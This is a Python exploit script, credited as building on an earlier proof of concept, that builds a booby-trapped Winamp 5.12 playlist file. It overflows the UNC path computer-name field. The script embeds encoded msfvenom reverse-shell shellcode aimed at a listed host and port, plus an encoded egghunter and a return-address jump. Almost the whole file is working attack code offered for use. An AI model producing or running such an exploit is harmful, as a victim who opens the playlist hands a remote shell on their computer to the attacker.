#!/usr/bin/env python

# ====================================================================
# Winamp 5.12 Playlist UNC Path Computer Name Overflow Python Exploit
# Original Poc by Umesh Wanve (umesh_345@yahoo.com)
# ==================================================================== 
from struct import pack

def p(x): return pack('<L', x)

start    = "[playlist]\r\nFile1=\\\\"
payload  = "T00WT00W"
# msfvenom --encoder x86/alpha_mixed -p windows/shell_reverse_tcp LHOST=192.168.80.137 LPORT=443 -f py
payload += (
"\x81\xe4\xf0\xff\xff\xff" # stack alignment
"\x89\xe3\xdd\xc4\xd9\x73\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
"\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x69\x78\x4e\x62\x37\x70\x55\x50\x45\x50\x73\x50\x6e\x69\x6a\x45\x55"
"\x61\x79\x50\x75\x34\x6e\x6b\x66\x30\x70\x30\x6e\x6b\x43\x62\x74\x4c\x6e\x6b\x61\x42\x64\x54\x4c\x4b\x53"
"\x42\x77\x58\x36\x6f\x4c\x77\x53\x7a\x37\x56\x54\x71\x59\x6f\x6e\x4c\x45\x6c\x71\x71\x33\x4c\x35\x52\x36"
"\x4c\x51\x30\x7a\x61\x6a\x6f\x36\x6d\x46\x61\x4b\x77\x49\x72\x48\x72\x43\x62\x46\x37\x4e\x6b\x62\x72\x66"
"\x70\x6c\x4b\x33\x7a\x67\x4c\x4e\x6b\x42\x6c\x47\x61\x70\x78\x4b\x53\x43\x78\x47\x71\x68\x51\x33\x61\x4c"
"\x4b\x50\x59\x77\x50\x75\x51\x48\x53\x4e\x6b\x73\x79\x56\x78\x49\x73\x65\x6a\x53\x79\x4e\x6b\x30\x34\x6c"
"\x4b\x65\x51\x6e\x36\x66\x51\x4b\x4f\x4c\x6c\x59\x51\x78\x4f\x44\x4d\x43\x31\x6a\x67\x56\x58\x59\x70\x31"
"\x65\x5a\x56\x35\x53\x71\x6d\x79\x68\x57\x4b\x73\x4d\x56\x44\x54\x35\x39\x74\x43\x68\x4e\x6b\x52\x78\x74"
"\x64\x56\x61\x38\x53\x45\x36\x6e\x6b\x34\x4c\x72\x6b\x4c\x4b\x63\x68\x67\x6c\x43\x31\x49\x43\x6e\x6b\x73"
"\x34\x4e\x6b\x37\x71\x7a\x70\x6c\x49\x51\x54\x66\x44\x31\x34\x43\x6b\x33\x6b\x51\x71\x63\x69\x30\x5a\x46"
"\x31\x79\x6f\x39\x70\x43\x6f\x61\x4f\x71\x4a\x4c\x4b\x42\x32\x7a\x4b\x4c\x4d\x43\x6d\x30\x68\x76\x53\x65"
"\x62\x65\x50\x73\x30\x53\x58\x44\x37\x73\x43\x35\x62\x63\x6f\x43\x64\x61\x78\x32\x6c\x51\x67\x65\x76\x46"
"\x67\x69\x6f\x48\x55\x4d\x68\x6a\x30\x35\x51\x55\x50\x67\x70\x77\x59\x5a\x64\x56\x34\x30\x50\x31\x78\x44"
"\x69\x6f\x70\x32\x4b\x73\x30\x4b\x4f\x38\x55\x46\x30\x62\x70\x66\x30\x50\x50\x31\x50\x52\x70\x53\x70\x30"
"\x50\x72\x48\x49\x7a\x36\x6f\x4b\x6f\x69\x70\x79\x6f\x79\x45\x6c\x57\x32\x4a\x64\x45\x30\x68\x6b\x70\x4d"
"\x78\x50\x50\x6b\x39\x32\x48\x35\x52\x77\x70\x66\x61\x4f\x4b\x6e\x69\x6d\x36\x42\x4a\x64\x50\x43\x66\x52"
"\x77\x33\x58\x6f\x69\x4c\x65\x30\x74\x55\x31\x39\x6f\x58\x55\x4c\x45\x79\x50\x43\x44\x76\x6c\x69\x6f\x50"
"\x4e\x74\x48\x43\x45\x48\x6c\x30\x68\x4a\x50\x58\x35\x49\x32\x76\x36\x79\x6f\x78\x55\x72\x48\x31\x73\x70"
"\x6d\x61\x74\x47\x70\x6b\x39\x6d\x33\x56\x37\x62\x77\x33\x67\x44\x71\x79\x66\x52\x4a\x35\x42\x36\x39\x72"
"\x76\x38\x62\x79\x6d\x72\x46\x5a\x67\x61\x54\x77\x54\x57\x4c\x65\x51\x36\x61\x4c\x4d\x32\x64\x75\x74\x64"
"\x50\x6f\x36\x37\x70\x62\x64\x31\x44\x32\x70\x72\x76\x73\x66\x76\x36\x51\x56\x31\x46\x70\x4e\x51\x46\x72"
"\x76\x70\x53\x61\x46\x35\x38\x52\x59\x68\x4c\x57\x4f\x4b\x36\x6b\x4f\x6b\x65\x6d\x59\x6b\x50\x30\x4e\x31"
"\x46\x52\x66\x39\x6f\x54\x70\x61\x78\x46\x68\x6f\x77\x47\x6d\x33\x50\x6b\x4f\x6b\x65\x6d\x6b\x48\x70\x6d"
"\x65\x49\x32\x56\x36\x72\x48\x4c\x66\x7a\x35\x4d\x6d\x6d\x4d\x79\x6f\x6e\x35\x45\x6c\x64\x46\x51\x6c\x55"
"\x5a\x6d\x50\x69\x6b\x49\x70\x50\x75\x34\x45\x4d\x6b\x71\x57\x54\x53\x50\x72\x72\x4f\x31\x7a\x63\x30\x56"
"\x33\x69\x6f\x69\x45\x41\x41"
)
payload += "\x90" * (895 - len(payload))

# wine egghunt.exe cstyle 0x57303054
# >>> f = open('egg.bin', 'w')
# >>> f.write("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
# >>> f.close()
# /usr/share/framework2/msfencode -i egg.bin -e Alpha2 -t c
payload += (
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x51\x5a\x6a\x45"
"\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x55\x41\x32\x41\x41\x32"
"\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x5a\x49\x42\x46\x4f"
"\x71\x78\x4a\x49\x6f\x56\x6f\x30\x42\x70\x52\x53\x5a\x65\x52\x72"
"\x78\x78\x4d\x74\x6e\x37\x4c\x46\x65\x50\x5a\x63\x44\x4a\x4f\x4d"
"\x68\x33\x64\x50\x30\x70\x30\x73\x67\x4c\x4b\x58\x7a\x6c\x6f\x34"
"\x35\x68\x6a\x6e\x4f\x74\x35\x38\x67\x6b\x4f\x4b\x57\x45"
)
payload += "\x90" * (1022 - len(payload))

# jmp to the egghunter
call_esp = p(0x1073614f)
sub_esp_jmp_esp = "\x83\xec\x7f" * 1 + "\xff\xe4"
jmp = call_esp + sub_esp_jmp_esp + "\x90" * 7

end = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"

f = open('playlist.pls', 'w')
f.write(start + payload + jmp + end)
f.close()
